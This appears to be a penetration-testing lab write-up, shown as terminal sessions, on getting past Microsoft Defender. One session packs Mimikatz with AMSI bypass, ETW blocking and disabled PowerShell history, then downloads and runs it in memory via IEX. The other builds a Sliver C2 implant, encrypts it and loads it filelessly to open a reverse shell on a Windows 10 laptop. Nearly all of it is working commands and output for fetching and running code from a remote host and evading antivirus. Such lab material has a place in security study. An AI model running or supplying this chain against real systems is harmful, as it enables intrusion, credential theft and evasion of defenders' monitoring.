- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

PS C:\Temp > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/
             Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');

  ___ ___    ___        _
 | _ \ __|__| _ \__  __| |_____ _ _
 |  _/ _|___|  _/ _|/ _| / / -_)  _|
 |_| |___|  |_| \__,\__|_\_\___|_|
                                   v1.4

Usage:
> Import-Module ./Invoke-PoSH-PePacker.ps1
> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)


PS C:\Temp> Invoke-PoSH-PePacker -FileUrl http://192.168.1.144:8080/mimikatz.exe -Outfile C:\Temp\packed-mimi2025.ps1

[*] Downloading the remote PE file: 'http://192.168.1.144:8080/mimikatz.exe'
[*] Creating the reflective PE file injection script
[*] File compression (GZip/Deflate)
[*] File encryption (AES)
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] The obfuscated & encrypted PE file loader script has been saved: 'C:\Temp\packed-mimi2025.ps1' ...
[+] Done!

PS C:\Temp>

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - 
Step 2 - Download and execute straight into memory the PowerShell script (that embed Mimikatz) on a Windows server 2022 
	 without being detected nor blocked by the Microsoft Defender Antivirus 
         (AMSI bypass, Reflective PE injection, Disabling PowerShell history logging, ...)
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - 

PS C:\Users\Administrator> systeminfo

Host Name:                 SERVER-WIN2022
OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-40000-00001-AA898
Original Install Date:     5/2/2025, 10:44:40 AM
System Boot Time:          5/26/2025, 11:26:53 AM
<SNIP>

PS C:\Users\Administrator>  Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated|FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 5/26/2025 6:31:01 AM


PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/packed-mimi2025.ps1');

PS C:\Users\Administrator> Execute-PE Coffee

VERBOSE: PowerShell ProcessID: 1188
VERBOSE: Calling Invoke-MemoryLoadLibrary
VERBOSE: Getting basic PE information from the file
VERBOSE: Allocating memory for the PE and write its headers to memory
VERBOSE: Getting detailed PE information from the headers loaded in memory
VERBOSE: StartAddress: 0x000001E31A8B0000    EndAddress: 0x000001E31AA21000
VERBOSE: Copy PE sections in to memory
VERBOSE: Update memory addresses based on where the PE was actually loaded in memory
VERBOSE: Import DLL's needed by the PE we are loading
VERBOSE: Done importing DLL imports
VERBOSE: Update memory protection flags
VERBOSE: Call EXE Main function. Address: 0x000001E31A9744D0. Creating thread for the EXE to run in.

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 28 2024 17:42:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # Coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

mimikatz #
mimikatz # exit
Bye!
VERBOSE: EXE thread has completed.
VERBOSE: Done!

PS C:\Users\Administrator>


---------------------------------------------------------------------------------------------------------------------------------------------------
➤ Test 2 - PoC with the tool 'FilelessPELoader' on a Windows 10 laptop protected by the MS Defender antivirus
            -> Download & execution in-memory of hacking tools without detection
---------------------------------------------------------------------------------------------------------------------------------------------------

The tool "FilelessPELoader" allows to load and execute directly into memory an encrypted remote Portable Executable (PE).
=> Source: https://github.com/TheD1rkMtr/FilelessPELoader

Notes regarding AV detection
-----------------------------
This loader works well however during my tests well-known hacking tools such as "Mimikatz.exe" or meterpreter shells were 
detected & blocked by Windows Defender.


Step 1 - Download and compile the tool 'FilelessPELoader'
---------------------------------------------------------

C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main

02/11/2023  06:34 PM    <DIR>          .
02/11/2023  06:34 PM    <DIR>          ..
02/11/2023  06:34 PM               967 aes.py
03/19/2023  09:20 PM    <DIR>          FilelessPELoader
02/11/2023  06:34 PM         1,250,056 mimikatz.exe
02/11/2023  06:34 PM               565 README.md
               3 File(s)      1,251,588 bytes
               3 Dir(s)  248,797,466,624 bytes free


C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\FilelessPELoader\x64\Release>dir
 Volume in drive C is Windows
 Volume Serial Number is F06E-DC58

 Directory of C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\FilelessPELoader\x64\Release

03/19/2023  11:21 PM    <DIR>          .
03/19/2023  11:21 PM    <DIR>          ..
03/19/2023  09:20 PM            20,992 FilelessPELoader.exe
03/19/2023  09:20 PM               373 FilelessPELoader.exe.recipe
03/19/2023  09:20 PM           183,194 FilelessPELoader.iobj
03/19/2023  09:20 PM            86,544 FilelessPELoader.ipdb
03/19/2023  09:20 PM             2,197 FilelessPELoader.log
03/19/2023  09:20 PM           385,500 FilelessPELoader.obj
03/19/2023  09:20 PM           667,648 FilelessPELoader.pdb
03/19/2023  09:20 PM    <DIR>          FilelessPELoader.tlog
03/19/2023  09:20 PM               132 FilelessPELoader.vcxproj.FileListAbsolute.txt
03/19/2023  09:20 PM           208,896 vc142.pdb
               9 File(s)      1,555,476 bytes
               3 Dir(s)  248,799,092,736 bytes free


Step 2 - Generate a SLIVER https reverse shell and encrypt it with the python script 'aes.py'
---------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/SLiver-C2$ sudo sliver-server
[*] Loaded 17 aliases from disk
[*] Loaded 16 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain reinforce
[*] Server v1.5.31 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > generate --arch amd64 -f exe --http 192.168.1.30 --save /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe --os Windows
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m5s
[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe


jeff@kali:~/Documents/Tools/FilelessPELoader-main$ sudo chmod 764 /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ cp /home/jeff/Documents/Tools/SLiver-C2/SliverShell.exe ./

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ ls
aes.py  cipher.bin  FilelessPELoader  key.bin  mimikatz.exe  README.md  shell.exe  SliverShell.exe

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ sudo python3 aes.py SliverShell.exe 

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ ls -al
total 38368
drwxr-xr-x  3 jeff jeff     4096 Mar 19 23:31 .
drwxr-xr-x 61 jeff jeff     4096 Mar 19 22:48 ..
-rwxr-xr-x  1 jeff jeff      967 Mar 19 22:53 aes.py
-rw-r--r--  1 root root 18570768 Mar 19 23:31 cipher.bin
drwxr-xr-x  2 jeff jeff     4096 Feb 11 18:34 FilelessPELoader
-rw-r--r--  1 root root       16 Mar 19 23:31 key.bin
-rw-r--r--  1 jeff jeff  1250056 Feb 11 18:34 mimikatz.exe
-rw-r--r--  1 jeff jeff      565 Feb 11 18:34 README.md
-rw-r--r--  1 jeff jeff   207872 Mar 19 23:21 shell.exe
-rwxr--r--  1 jeff jeff 18570752 Mar 19 23:31 SliverShell.exe

jeff@kali:~/Documents/Tools/FilelessPELoader-main$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...



Step 3 - Download & execute (in-memory) the encrypted SLiver C2 implant using the tool 'FilelessPELoader'
---------------------------------------------------------------------------------------------------------

C:\Temp>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 3/19/2023 10:28:59 AM

PS C:\Users\Administrator> cmd
Microsoft Windows [Version 10.0.14393]
(c) Microsoft Corporation. All rights reserved.

c:\Users\Administrator> cd C:\temp
c:\temp>

C:\Temp>.\FilelessPELoader.exe 192.168.1.30 8080 cipher.bin key.bin

[+] Get AES Encrypted PE from 192.168.1.30:8080
[+] Get AES Key from 192.168.1.30:8080
[+] AES PE Address : 0000020BE07D7040
[+] AES Key Address : 0000020BDE728720
[+] Decrypt the PE
[+] PE Decrypted
[+] Loading and Running PE


Step 4 - Enjoy the SLIVER reverse shell running on the target Windows 10 laptop without being detected by the MS Defender AV
----------------------------------------------------------------------------------------------------------------------------

[server] sliver > https --lhost 192.168.1.30 --lport 443

[*] Starting HTTPS :443 listener ...

[*] Successfully started job #1

[*] Session f7e6fcb7 ROUND_CRIMINAL - 192.168.1.144:58771 (PO744653) - windows/amd64 - Sun, 19 Mar 2023 23:32:49 CET

[server] sliver > sessions

 ID         Transport   Remote Address        Hostname   Username     Operating System   Health  
========== =========== ===================== ========== ============ ================== =========
 f7e6fcb7   http(s)     192.168.1.144:58771   PO744653   LAB\jfc   windows/amd64      [ALIVE] 

[server] sliver > sessions f7e6fcb7
error: invalid usage of command 'sessions' (unconsumed input 'f7e6fcb7'), try 'help'
[server] sliver > sessions -i f7e6fcb7

[*] Active session ROUND_CRIMINAL (f7e6fcb7)

[server] sliver (ROUND_CRIMINAL) > getuid

S-1-5-21-666114207-261065646-224150901-1121

[server] sliver (ROUND_CRIMINAL) > whoami

Logon ID: LAB\jfc
[*] Current Token ID: LAB\jfc
[server] sliver (ROUND_CRIMINAL) >  

<SNIP>
